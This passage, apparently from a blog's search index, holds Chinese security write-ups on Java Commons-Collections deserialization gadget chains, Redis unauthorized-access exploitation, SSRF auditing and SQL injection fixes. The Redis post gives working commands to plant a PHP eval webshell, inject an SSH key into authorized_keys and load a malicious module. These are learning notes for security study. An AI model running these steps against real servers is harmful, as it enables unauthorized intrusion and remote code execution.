PriorityQueue.siftDownUsingComparator中被调用，comparator可以在类构造函数中被赋值可控： 3、PriorityQueue.siftDownUsingComparator可以在 PriorityQueue.readObject中被调用： 问：为什么 Commons-Collections 3.2.1中不能利用这条链呢？ 答：因为 Commons-Collections 3.2.1 中 TransformingComparator类没有实现 Serializable接口，不能被反序列化： 利用链流程图 CC2CC2的核心思想还是 CC4链，只不过 CC2使用 InvokerTransformer直接调用 Templates.newTransformer，没利用 InstantiateTransformer。 完整 EXP EXP构造逻辑 + 流程图"},{"title":"Commons-Collections-CC5链分析","date":"2025-02-08T10:13:55.867Z","url":"/2025/02/08/CC5%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"CC5完整 EXP EXP构造逻辑1、CC5调用利用的是 LazyMap类中的 get方法来调用 chainedTrsformer.transform来进行命令执行。根据分析 CC6时的经验，TiedMapEntry.getValue方法可以用来调用 LazyMap.get： 但是 CC5并非像 CC6中利用 hashCode方法来调用 getValue，而是用 toString方法： 2、toString方法可以在 BadAttributeValueExpException.readObject中被调用： val值可控，在构造函数中赋值： 根据上述逻辑，这条链子基本齐了： 构造注意点使用构造函数给 val赋值的时候，若 val不为 null，则会先调用一次 val.toString，提前命令执行。这和 CC6中的 HashMap.put提前触发命令执行的逻辑很像。 但是 CC5不能采取 CC6的处理方式，因为 readObject中对 valObj的类型进行了判断，如果是 String类型，就不会触发 valObj.toString： 故解决方案是先将 val赋值为 null，在构造函数中不调用 toString，再利用发射给 val赋值： 利用链流程图"},{"title":"Commons-Collections-CC3链分析","date":"2025-02-08T04:49:37.325Z","url":"/2025/02/08/CC3%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Commons-Collections CC3链不同于前几条链的命令执行，而是可以加载恶意字节码实现代码执行。 CC3链有两种调用方式： (1) 使用 InvokerTransformer调用 Templates.newTransformer (2) 使用 InstantiateTransformer类 + TrAXFilter类进行调用 (当 InvokerTransformer在黑名单中时) 核心利用链 (TemplatesImpl.newTransformer) 1、_name不能为 null，需利用反射赋值，defineTransletClasses加载恶意类后实例化执行任意代码，跟进 defineTransletClasses： 2、赋值bytecodes恶意字节码，bytecodes是一个二维数组，在 for循环中加载恶意类，且恶意类的父类必须是 AbstractTranslet： EXPEvil.class (Evil.java编译后) exp CC3 + CC1-TransformedMap链InvokerTransformer调用EXP InstantiateTransformer调用EXP 构造逻辑1、查找 TemplatesImpl.transformer的用法，在 TrAXFilter类的构造函数中被调用，templates可控： 2、可以利用 InstantiateTransformer.transform获取其构造方法并进行实例化： 根据流程图可知，CC3不仅可以和 CC1- TransformedMap联合利用，和 LazyMap链，CC6等都是可以的。 CC3 + CC1-LazyMap链 CC3 + CC6"},{"title":"Commons-Collections-CC6链分析","date":"2025-02-07T08:18:19.041Z","url":"/2025/02/07/CC6%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Commons-Collections &lt;&#x3D; 3.2.1 CC6链是所有 gadget chain中最通用的攻击链。CC6的优势是不依赖 jdk版本进行攻击。 CC6链的核心思想参考 URLDNS链，利用 HashMap.readObject触发 hash方法，再触发 hashCode直至漏洞点。 完整EXP EXP构造逻辑1、依然利用 LazyMap.get，CC6链利用了 Commons-Collections 3.2.1中的 TiedMapEntry中的 getValue方法： 2、getValue方法在 TiedMapEntry.hashCode方法中被调用： 3、如何调用 TiedMapEntry.hashCode就是下一步逻辑，借用 URLDNS链的思想，可以利用 HashMap.readObejct方法调用 hash(key)方法，进而触发 key.hashCode方法： 根据上述思路，初步构造EXP： 但并非是由 HashMap.readObject造成的命令执行，而是和 URLDNS链类似，由 hashMap.put提前调用了 hash方法，触发 hashCode造成的命令执行： 可以先将 LazyMap中 factory属性的值设置为 非chainedTransformer，hashMap.put结束后再利用反射(factory为 pricate属性) 修改 factory为 chainedTransformer： 使用修改后的 exp执行反序列化代码，无法命令执行，跟进 hashMap.put，步进到 LazyMap.get方法，在第一次put时，若 lazyMap中没有这个 key，会进入 if方法调用 factory.transform方法，然后将 key添加到 lazyMap中。当 HashMap.readObject触发 LazyMap.get方法时，由于 key已经被添加到 lazyMap中，故不会进入 if逻辑，直接返回，不会触发命令执行： 在 hashMap.put后将 lazyMap中的 key值 remove掉就可以了： 调用链流程图"},{"title":"Ysoserial_URLDNS链分析","date":"2025-02-07T03:49:57.939Z","url":"/2025/02/07/Ysoserial_URLDNS%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"学习 Commons-Collections CC6利用链时遇到了 URLDNS链中的逻辑，故先分析 URLDNS链，为 CC6链打下基础。 Ysoserial-URLDNS gadget chain:  完整EXP EXP构造逻辑1、HashMap.readObject中调用了 hash方法： 2、HashMap.hash(Object key) 接收 Object key参数调用 key.hashCode()： 3、URL类中，URL.hashCode调用了 handler.hashCode： 跟进 handler.hashCode，进入到 URLStreamHandler.hashCode，调用 getHostAddress： 4、根据上述逻辑初步构造利用链代码如下： 但存在问题，hashMap.put会提前触发 getHostAddress并修改 hashCode的值使反序列化时无法触发 getHostAddress。 因为在 hashMap.put(url, 1)时会提前调用一次 HashMap.hash方法： 从而触发 hashCode方法，在 readObject之前先调用一次 hashCode，触发 dns请求，并且 hashCode的值发生改变，这就意味着 readObject时的 hashCode !&#x3D; -1从而直接 return hashCode，不会触发 dns请求： 由于 URL类中的 hashCode属性为private，故利用反射在 hashMap.put前修改 URL.hashCode的值不为-1，hashMap.put后再改回-1即可： URLDNS调用链流程图"},{"title":"Commons-Collections-CC1-LazyMap链分析","date":"2025-02-07T01:18:40.063Z","url":"/2025/02/07/CC1%E9%93%BE_LazyMap%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"CC1链除了 TransformedMap链之外，还存在 LazyMap链。LazyMap链的核心原理是 Java动态代理，前面 Blog已经详细分析，这里不做赘述。 完整EXP EXP构造逻辑1、依然是查找 InvokerTransformer.transform的用法，在 LazyMap.get方法中被调用： factory在 LazyMap.decorate和构造函数中可控： 2、AnnotationInvocationHandler.invoke方法中调用了 memberValues.get方法，memberValues可控： AnnotationInvocationHandler是一个调用处理器，配合 Java动态代理即可调用。 观察 invoke方法的前文逻辑，到达 get方法前需要对 method进行多次判断，即调用处理器对象调用的方法不为 equals、toString、hashCode、annotationType，且为无参方法。 3、AnnotationInvocationHandler.readObject中的 memberValues.entrySet符合条件，代理 Map接口调用 memberValues.entrySet就会触发 AnnotationInvocationHandler.invoke方法： CC1完整调用链流程图"},{"title":"Java设计模式-静/动态代理","date":"2025-02-06T06:22:01.134Z","url":"/2025/02/06/%E9%9D%99%E6%80%81%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","tags":[["Java设计模式","/tags/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Java静态代理Java静态代理是 Java中的一种设计模式。静态代理就是通过一个代理对象来间接访问真实对象。代理类会“代理”真实类的行为，可以在代理类中添加额外的功能或逻辑（例如日志、性能监控等），而不需要修改真实类的代码。 首先定义一个接口 subject： 实现类 SubjectImpl实现接口中的 request()方法： 静态代理类，代理真实的请求，加上了一些额外的处理逻辑 (更新日志等)： 客户类 Client使用静态代理的模式调用 request()方法： 静态代理的好处是在不修改真实类 (subjectImpl) 的前提下，为 (request) 方法增加一些额外的功能，比如日志、缓存等。 Java动态代理Java动态代理也是一种设计模式，由 Java JDK提供，可以减少很多重复代码，提高效率。 当 Subject接口中只有一种方法时，静态代理看起来还不错，但当 Subject接口中需要实现多种方法时，静态代理会使代码庞杂冗余： 这种情况下使用动态代理。 InvocationHandler (调用处理器) 接口 -&gt; 通过反射机制 (invoke方法) 动态代理对象： 定义 SubjectInvocationHandler类通过反射进行动态代理： 客户端通过 Proxy.newProxyInstance创建动态代理对象，分别接收三个参数。 (1) ClassLoader loader 类加载器 (不影响 invoke的执行)。 (2) Class&lt;?&gt; [] interfaces 被代理的接口(s) - 数组，若指定了 interfaces，代理对象都被视为实现了 interfaces接口，调用 Interfaces接口时，都会先经过 InvocationHandler.invoke()方法。 (3) InvocatonHandler h 调用处理器对象，重写定义了 invoke()方法。 动态代理中的命令执行当 SubjectInvocationHandler.invoke()方法中存在危险函数&#x2F;逻辑缺陷： 可以利用 Map接口调用 put方法触发 SubjectInvocationHandler.invoke()： "},{"title":"Commons-Collections-CC1链分析","date":"2025-02-05T03:10:18.404Z","url":"/2025/02/05/CC1%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"调试环境配置复现环境：jdk1.8.0_65 (&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;jdk1.8.0_65.jdk&#x2F;Contents&#x2F;Home) ​ .java源码 (&#x2F;Users&#x2F;gehansheng&#x2F;Desktop&#x2F;Java代码审计&#x2F;CC链&#x2F;CC1&#x2F;jdk-af660750b2f4 ​  仓库中下载 JDK源码包 ​ Commons-Collections 3.2.1 原安装的 jdk文件夹中的多为 .class反编译后的文件，代码不易阅读和调试，替换为 .java源码文件即可。 src&#x2F;share&#x2F;classes 中保存着 Java标准库源码 同理，使用 maven导入 Commons-Collections依赖的时候，maven添加的也是编译后的 .class文件，手动下载源代码即可： 完整EXP EXP构造逻辑正常使用 Java反射实现RCE逻辑不做赘述 (1) Commons-Collections 3.2.1中，存在核心接口 Transformer，是一种对象转换的机制，用于将一个输入对象转换为另一个输出对象。 (2) InvokerTransformer类实现了 Transform方法，可以通过反射调用输入对象的方法： (3) InvokerTransformer中的 transform方法在 TransformedMap的 checkSetValue方法中被调用： ![image-20250205162426065](&#x2F;Users&#x2F;gehansheng&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250205162426065.png) 若 valueTransformer的值可控，则可以实现命令执行。 valueTransformer的值在构造函数 TransformedMap中被定义： 但 TransformedMap构造函数的属性为 protected，protected属性修饰的方法只能被当前类&#x2F;子类调用，所以需要找一个当前类&#x2F;子类中调用了 TransformedMap构造方法的 public方法。 当前类 public方法 decorate调用了构造方法 TransformedMap： 由此 valueTransformer可控： (4) 继续向上找 checkSetValue方法在哪里被调用，TransformedMap父类 AbstractInputCheckedMapDecorator中的 MapEntry类中的 setValue方法调用了它： 使用 for循环遍历 transformedMap中的键值时，调用 setValue方法，进而触发 checkSetValue方法实现命令执行 (5) setValue方法在 AnnotationInvocationHandler.readbject方法中被调用，同样是遍历 Map的场景，这条链子大致就齐了： memberValues的值需可控，类 AnnotationInvocationHandler和其构造方法未使用任何访问修饰符进行修饰，只有同一包中的类可以进行访问调用。 故使用反射进行调用： type的属性是一种 Class泛型，Annotation是 Java中所有注解类的父类，所以 type需要赋值一种注解类。 几处需要注意的 gadget1、Runtime类没有实现 java.io.Serializable接口，不能被序列化和反序列化，需要使用反射来配合 InvokerTransformer构造。 正常反射调用 Runtime.getRuntime().exec()： 配合 InvokerTransformer： 可以利用类 ChainedTransformer中 transform方法可以递归调用 InvokerTransformer方法： 2、AnnotationInvocationHandler.readObject的执行逻辑到达 memberValue.setValue之前，需要经过两个 if条件： 断点调试 readObejct的步进逻辑可知，首先使用 annotationType获取注解 Override，接着使用 annotationType.memberTypes获取注解成员，键为注解成员的值，值为注解成员的类型。 最后判断注解成员是否和memberValue的键值相同，相同则不为 null，通过 if判断。 但 Override.class中无成员，所以更换为 Target.class，并修改 hashMap中传入的键值： 3、最后需要确保 setValue的值可控，虽然 AnnotationInvocationHandler.readObject中已经确定了 setValue的值，但可以利用 ConstantTransformer类修改。 ConstantTransformer.transform无论输入数据是什么，都返回常量 iConstant，iConstant在构造函数中被赋值，利用 ConstantTransformer和 ChainedTransformer可以控制 setValue值： CC1链流程图"},{"title":"浅谈Redis未授权攻击","date":"2025-01-27T11:13:18.216Z","url":"/2025/01/27/%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83/","tags":[["Redis未授权","/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"]],"categories":[["Redis未授权","/categories/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"]],"content":"Redis未授权访问利用条件： 1、redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 2、没有设置密码认证（一般为空），可以免密码远程登录redis服务。 未授权连接 redis-cli -h 101.xx.xx.xxx，并使用 info命令列出受害机 redis服务信息 Redis未授权 getshell利用 redis未授权写入 webshell实现 getshell。 利用前提：redis服务端存在 web服务器，且通过某种方式(phpinfo泄漏等)获得Web目录的根路径，且具有文件的读写权限，就可以利用 redis写入一句话木马 getshell。 1、将 redis工作目录修改至 Web根目录 config set dir /wwwroot/www/ 2、将 redis的数据文件名称(dbfilename)设置为 shell.php config set dbfilename shell.php 3、写入一句话木马shell config set payload &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; 4、保存 save 由此在网站根目录下写入一句话木马，使用蚁剑连接  利用 redis未授权写入 ssh公钥首先需要了解 ssh公钥认证机制： SSH 使用公钥认证来进行无密码登录。用户需要将自己的公钥添加到远程服务器的 ~/.ssh/authorized_keys 文件中，服务器会通过公钥验证用户的身份。如果公钥匹配，就可以成功登录。 利用 CONFIG SET 命令更改 Redis 配置 Redis 允许通过 CONFIG SET 命令更改配置，攻击者可以将 dir 配置更改为目标主机的 ~/.ssh 目录。这样，攻击者可以直接通过 SET 命令将数据写入该目录，覆盖 authorized_keys 文件，添加自己的 SSH 公钥。 首先在攻击机生成 ssh公钥并保存： ssh-keygen -t rsa 1、将 ssh公钥值写入到 redis键 pubKey中： cat /Users/gehansheng/.ssh/id_rsa.pub | redis-cli -h 101.42.13.105 -x set pubKey |（管道符）：将 cat 命令的输出传递给后续的命令 -x：表示从标准输入读取数据，并将数据作为值存储到 Redis。 2、将工作目录设置到 /home/ubuntu/.ssh config set dir /home/ubuntu/.ssh 3、将 redis的数据文件名称设置为 authorized_keys，这意味着 Redis 将数据存储在 /root/.ssh/authorized_keys 文件中，而不是默认的 dump.rdb 文件。 config set dbfilename authorized_keys 4、保存 save 但尝试使用 ssh免密连接时发现失败，查看写入的 authorized_keys文件，发现是由于公钥和 redis缓存中其他数据混合在一起导致的 修改命令，添加换行符，防止数据混淆 (echo -e &quot;\\n\\n&quot;; cat /Users/gehansheng/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ~/Desktop/key.txt 正确添加公钥后，便可使用 ssh公钥免密登录 ssh 1xx.xx.xx.xxx 配合 SSRF getshell当 redis服务绑定在 127.0.0.1时，只能从本地主机访问 redis服务端，此时无法从公网直接未授权访问并写入 shell了，但是可以利用 ssrf + gopher协议来写入 shell。 python脚本如下： 利用脚本生成 payload后打 ssrf即可。 ![image-20250202165210627]( Redis主从复制 getshell主从复制原理： 从节点 (slaver) 全量同步主节点 (Master) 的数据，同步过程中，主节点会生成一个RDB快照文件发送给从节点，从节点加载该RDB文件恢复数据。 getshell关键点： 从 Redis &gt;&#x3D; 4.0开始，主从复制的 RDB中可以包含模块(Module)的加载指令。如果攻击者伪装成主节点，向从节点发送包含恶意模块加载指令的RDB文件，从节点会自动加载并执行该模块。 Redis支持通过动态链接库(.so文件)来拓展功能，加载模块命令如下 module load /path/exp.so 自动化 RCE工具：  Exp.so payload: "},{"title":"浅谈Java中的SSRF审计","date":"2025-01-24T07:05:42.089Z","url":"/2025/01/24/%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84SSRF%E5%AE%A1%E8%AE%A1/","tags":[["SSRF","/tags/SSRF/"]],"categories":[["SSRF","/categories/SSRF/"]],"content":"前言前段时间面试某大厂安全实习生岗位时，被着重问到了 Java审计 SSRF漏洞时，需要重点关注哪些类 ? 我：我审计 SSRF时基本只关注一些关键字函数，没怎么关注过敏感类 😭😭😭 常出现的业务点SSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。 出现SSRF漏洞的主要业务有： (1) 通过URL地址分享网页内容 (2) 在线服务，外链文章翻译 (有道) (3) 通过URL地址加载或下载图片，PDF导出 (4) 加载远端配置 常见利用点http协议利用url =  file协议利用url =  总结不全，后续深入探究 ssrf打内网的利用。 重点审计类&#x2F;函数java.net.URL 和 java.net.URLConnectionservice层： Controller层： java.net.HttpURLConnection和Javax.net.ssl.HttpsURLConnection这两个类都是 java.net.URLConnection 的子类，分别用于处理 http和 https请求。 org.apache.http.client.methods.HttpGet和org.apache.http.client.methods.HttpPostApache HttpClient 是一个功能强大的 HTTP 客户端库，用于发送 HTTP 请求。 okhttp3.Request和okhttp3.OkHttpClient 除了建立 HTTP(s)协议连接，还可以直接通过 Socket建立连接，所以也要关注 Socket相关类。 java.net.Socketsocket.getInputStream().read() 和 socket.getInputStream().write() java.nio.channels.SocketChannelsocketChannel.connect() 总结： 修复方案 处理正确302跳转（在业务角度看，不能直接禁止302，而是对跳转的地址重新进行检查） 限制协议只能为http&#x2F;https，阻止跨协议 (如file协议，防止任意文件读取) 访问黑名单(禁止访问内网)，访问白名单(只允许访问白名单中的地址) 设置常见web端口白名单（防止端口扫描，可能业务设定比较大） 防御 SSRF中的 dns重绑定攻击 DNS重绑定攻击与防御绕过逻辑先对用户输入的 url进行一次 dns解析，判断其是否合法，若合法则继续进入到下一步逻辑中，伪代码如下所示： 通过 isValid()校验后，立即将 dns解析结果设置为服务器内网地址 (如 )，在服务器请求 url，第二次解析域名。此时已经过了ttl的时间，解析记录缓存IP被删除，所以重新进行 dns解析，解析结果为服务器内网地址，服务器请求内网数据并返回给攻击者： 解析记录缓存维持时间： 在传统的ssrf修复方案中，由于java会存在默认的dns缓存，所以一般认为java不存在DNS rebinding问题。但是试想这么一个场景，如果刚刚好到了DNS缓存时间，此时更新DNS缓存，那些已经过了SSRF Check而又没有正式发起业务请求的request，是否使用的是新的DNS解析结果。其实理论上只要在发起第一次请求后等到30秒之前的时候再请求即可，但为了保证效果，可以在28s左右，开始以一个较短的时间间隔去发送请求，以达到时间竞争的效果。 — 《SSRF安全指北》 修复方案 (final)由于 DNS重绑定攻击的存在，不得不设置一个更加全面的修复方案： 去除url中的特殊字符，限制协议为 http&#x2F;https 判断是否属于内网ip (黑名单) 如果是域名的话，将url中的域名改为ip - 防止dns rebinding，直接访问 ip不用二次进行dns解析 请求的url为3中返回的url 不跟随30x跳转（跟随跳转需要从1开始重新检测） "},{"title":"Hibernate框架中的SQL注入","date":"2025-01-21T03:24:22.726Z","url":"/2025/01/21/Hibernate%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","tags":[["SQL注入","/tags/SQL%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"前置概念：POJOPOJO (Plain Old Java Object) 是指 普通的 Java 对象，它没有继承自特定的类，也没有实现特定的接口。POJO 是一种简单的、符合 Java Bean 规范的 Java 类。可以把它理解成一个最普通的 JavaBean。 POJO 的特点是： 无特定继承：POJO 不需要继承自特定的父类，通常不继承任何框架类。 无特定接口：POJO 不需要实现任何特定的接口。 属性和方法：POJO 通常拥有一组私有属性，并提供公共的 getter 和 setter 方法来访问这些属性。 无框架依赖：POJO 不依赖于任何特定的框架或技术（如 EJB 等）。它是一个完全独立的 Java 类。 示例代码如下： 在 ORM框架中，POJO类通常用作映射数据库。 —————————————————————————————————————————————————— ORM框架ORM框架（Object-Relational Mapping Framework，面向对象与关系型数据库映射框架）是一种技术，它使得开发者能够在面向对象编程中使用对象来表示数据库中的数据，而不需要直接操作数据库中的表、行和列。ORM框架通过将对象的属性与数据库表中的字段相映射，实现了面向对象程序与关系型数据库之间的转换。 ORM的核心概念是将数据库中的表（table）、列（column）、映射到类（class）、和**对象（object）**的属性（field），使得开发者可以通过操作对象来进行数据库操作，而不必编写大量的SQL语句。ORM框架通过为开发者提供高级API，简化了数据库操作，自动生成SQL语句来完成对数据库的增、删、改、查操作。 工作原理 ORM框架通过映射关系将数据库表与程序中的类关联起来。通常包括以下几个步骤： 类映射：每个数据库表通常对应一个类，类的每个字段（属性）映射到表的每一列。类对象的操作会反映到数据库表的操作。 CRUD操作：开发者通过操作对象（增、删、改、查），ORM框架会自动将这些操作转换为相应的SQL语句，并执行这些SQL语句来操作数据库。 映射配置：ORM框架通常需要通过注解或XML配置文件指定类与数据库表之间的映射关系。 熟知的 ORM框架包括 Mybatis-plus，Hibernate等等。 —————————————————————————————————————————————————— JPAJPA（Java Persistence API）是一个用于 Java 平台上的对象关系映射（ORM）规范，它提供了一组标准化的接口和方法来简化 Java 应用程序与数据库之间的交互。JPA 使得 Java 开发者可以以面向对象的方式操作关系型数据库，并且与底层数据库的细节分离，避免了直接操作 SQL 语句。 JPA 本身并不是一个实现，而是一个规范。它定义了 Java 应用程序与关系型数据库交互的标准，开发者可以通过实现 JPA 规范的 ORM 框架（如 Hibernate、EclipseLink、OpenJPA）来使用 JPA 功能。 概念组成： 实体类（Entity）： 实体类是一个 Java 类，它代表了数据库中的一张表。每个实体类的实例代表该表的一行记录。实体类通常需要通过注解（如 @Entity）来标识，JPA 会根据这些实体类生成对应的数据库表。 持久化上下文（Persistence Context）： 持久化上下文是 JPA 管理实体的生命周期的容器。它负责跟踪所有已持久化实体的状态，并确保数据的一致性和持久性。持久化上下文与事务紧密结合。 实体管理器（EntityManager）： 实体管理器是 JPA 提供的一个接口，它用于管理实体对象的生命周期，执行对数据库的操作，如保存、更新、删除和查询。实体管理器是 JPA 操作数据库的核心接口。 查询语言（JPQL）： JPA 提供了一种面向对象的查询语言，称为 JPQL（Java Persistence Query Language）。JPQL 允许开发者使用面向对象的语法来执行数据库查询，而无需直接编写 SQL。JPQL 查询的是实体对象而不是数据库表。 注解（Annotations）： JPA 使用注解来描述实体类与数据库表之间的映射关系。例如，@Entity 用于标识实体类，@Id 用于标识主键，@Column 用于定义列映射等。 事务管理： JPA 提供了对事务的支持，确保操作的原子性。它可以与 JTA（Java Transaction API）进行集成，实现分布式事务控制。 JPA 常见注解： @Entity：用于标识一个类是实体类，映射到数据库表。 @Id：用于指定实体类的主键。 @GeneratedValue：用于指定主键的生成策略。 @Column：用于指定实体类属性和数据库列之间的映射关系。 @OneToMany、@ManyToOne、@ManyToMany、@OneToOne：用于定义实体类之间的关联关系。 @Table：用于指定数据库表的名称。 @Query：用于定义自定义的 JPQL 查询。 —————————————————————————————————————————————————— 搭建一个 SpringBoot. 3.x + Hibernate + HQL查询的项目Hibernate 是一个强大的 对象关系映射（ORM） 框架，它用于简化 Java 程序与关系型数据库之间的交互。ORM 的核心思想是将数据库表与 Java 对象进行映射，从而让开发者可以通过操作 Java 对象来实现对数据库的增、删、改、查等操作，避免了直接编写繁琐的 SQL 语句。个人感觉 Hibernate和 mybatis-plus的结构有些相似，都是使用了 ORM框架，但是 hibernate明显要更为复杂。 配置文件 pom.xml和 application.properties不做赘述。 (1) 首先创建 JPA实体类 person，对应的是数据库中的 person表： (2) 其次创建仓库接口，在 Spring Data JPA 中，可以通过继承 JpaRepository 来快速创建一个数据访问层接口。 JpaRepository 接口中提供了许多现成的数据库查询方法，比如 findById()方法，等等。如果提供的数据库查询方法无法满足需求，开发可以进行自定义。 使用默认的 findByUsername(String name)方法，数据库查询效果相当于 并且默认的查询方法使用了预编译，可以避免 sql注入。 (3) 除了使用默认提供的查询方法外，还可以使用 HQL构造查询语句来查询数据库，在服务层中使用： HQL（Hibernate Query Language，Hibernate 查询语言）是 Hibernate 框架中提供的一种查询语言，它与 SQL 类似，但 HQL 主要用于操作 Hibernate 实体对象而不是数据库表。HQL 使开发者能够使用面向对象的语法进行数据库查询，它是 Hibernate 框架特有的语言，旨在简化数据库操作，并减少对底层数据库表的直接依赖。 (4) 创建controller层，路由中使用服务层方法，启动项目，成功访问，得到数据库回显数据： HQL中的 sql注入参数直接拼接 HQL支持运行原生 SQL语句 - createNativeQuery()，若直接拼接参数会造成 sql注入： HQL中的预编译为了避免 SQL注入，HQL给出了几种参数绑定方式，即同理预编译的占位符。 (1) 命名参数占位 使用 : 后面跟输入参数的方式进行占位。 PS: 这个东西前段时间 京东面试的时候面试官问到了，当时只知道 ? 进行占位，完全没听说过冒号这个说法，现在看来是认知浅薄了。 占位符起到作用，进行了预编译： (2) 位置参数占位 效果同理，预编译，不做赘述。 (3) 列表占位 (in查询) 使用列表可以进行批量查询： 同样会进行预编译： "},{"title":"浅谈Java中的SQL注入","date":"2025-01-18T04:38:38.996Z","url":"/2025/01/18/%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","tags":[["SQL注入","/tags/SQL%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"环境Java: jdk_8u65 Mysql: 9.1.0 Mysql可视化：DBeaver 24.3.2 JDBCJDBC（Java Database Connectivity） 是一个 API（应用程序编程接口），用于 Java 应用程序与数据库之间的连接。它是直接用于数据库操作的接口，而不是介于应用程序和数据库之间的中间层。 1、Statement SQL语句拼接造成SQL注入 2、PreparedStatement 预编译使用不当预编译先编译 sql语句，无论后续用户输入如何，都作为字符串数据处理，而 sql注入只针对编译的过程进行破坏，所以预编译可以防御 sql注入。 并且还减少了 sql语句的编译次数，提高了性能。 正确的预编译语句如下所示： 但是预编译使用不当也会出现 sql注入。 (1) 未使用占位符，而是直接拼接虽然使用了预编译，但是没有使用 ? 进行占位，所以本质上还是直接拼接导致的 sql注入。 (2) in语句查询使用 in语句的场景有很多，比如收藏场景，勾选多篇文章，同时进行收藏，请求包可能如下所示： 当从数据库进行查询时，因为不清楚用户选中的文章的数量，开发可能会直接使用拼接的方式构造查询语句，导致sql注入。 修复： 可以先对用户传入的数据进行处理，确定对象的个数，根据个数增加占位符，再使用预编译。 比如 ‘取消收藏’的场景： (3) Like语句模糊查询有些业务会使用模糊查询，比如搜索框等场景 修复： 和 in语句类似，先对用户输入的数据进行判断，再添加占位符进行预编译： 但是 like的预编译并非百分百可靠，可以通过特殊字符 % 和 _ 来实现注入。 演示代码： 使用 % 和 _ 会导致返回所有结果，绕过预编译防御，所以要对 % 和 _ 进行过滤处理。 (5) Order by注入ORDER BY 是 SQL 中用于对查询结果进行排序的子句。它按照指定的列或表达式对数据进行升序（ASC）或降序（DESC）排列。默认情况下，ORDER BY 按升序排序。 正确的 order by查询使用如下所示： 其中 id为列名，意思是按照 id的大小进行生序排序。 但是预编译有一个特性，会强制给占位符所传入的数据加上 ‘’，’id’会被视为字符串而非列名，这样就不会按照预期进行排序。 所以在使用 JDBC连接的前提下想要使用 order by，就不能再使用预编译了，只能通过做好过滤，加WAF等方式来防御 sql注入。 MybatisMyBatis 是一款广泛使用的 Java 持久层框架，它通过将数据库操作与 Java 对象进行映射，简化了数据库操作的过程。MyBatis 允许开发者直接编写原生 SQL 查询语句，并通过 XML 或注解将 SQL 与 Java 方法进行映射，使得数据库操作更加灵活和高效。MyBatis 是一个 半自动化 的框架，开发者需要手动编写 SQL 语句，但它提供了映射功能，使得 SQL 查询结果可以直接映射为 Java 对象。 主要组件和原理SqlSessionFactory： SqlSessionFactory 是 MyBatis 的核心工厂类，负责创建 SqlSession 对象。它会根据全局配置文件（mybatis-config.xml）读取配置并初始化相关信息。 SqlSession： SqlSession 是 MyBatis 的核心接口，用于执行 SQL 查询、插入、更新、删除等操作。通过 SqlSession，你可以获取到映射器接口的代理对象，并执行相应的 SQL 操作。 Mapper 接口 Mapper 接口定义了数据库操作的方法，通常这些方法与 SQL 映射文件中的 SQL 标签一一对应。Mapper 接口通常由开发者编写，方法名与 XML 映射文件中的 id 匹配。 映射器 XML 文件 这个文件包含了 SQL 语句的定义，MyBatis 根据方法名称查找相应的 SQL 语句，并将查询结果映射成 Java 对象。 通过 id与 UserMapper接口中的方法名进行匹配。resultType指定数据库查询的结果会被映射到哪一个Java类，这里查询结果被映射到了 com.best.hello.entity.User类中。 Mybatis的两种传参方式${}: 将传入的参数直接拼接到 sql查询语句中，不做任何的处理。 #{}: 和预编译占位符异曲同工，先进性预编译后传参。将传入的数据都当作字符串，对传入的数据都加上双引号 “”。 (1) ${}直接拼接某些开发使用 Mybatis框架时，会使用 ${}传参导致 sql注入： 修复应使用 #{}： (2) in, Like查询like，in查询语句同理，使用 #{}即可。 Like: in: (3) Order by注入与 Jdbc同理，若使用 #{}会给传参加上双引号，导致列名被当作字符串解析，所以不得不使用 ${}，由此产生 sql注入。 Mapper接口： 映射器xml文件： 一个很好的修复方法是 ‘排序映射’，以我的理解，是一种类似于白名单的机制，严格限制用户输入： 用户的输入只能是 ‘id’ 和 ‘user’，若为其他直接使用默认排序，不再相信用户输入。 Mybatis-plusMybatis-Plus（简称MP）是基于MyBatis的增强工具，它简化了MyBatis的操作，提供了一些常用的功能，目的是让开发者在使用MyBatis时，能够更加高效、便捷地进行数据库操作。Mybatis-Plus不需要重写SQL语句，就能自动完成增、删、改、查等基本操作，减少了大量的代码重复性。 与 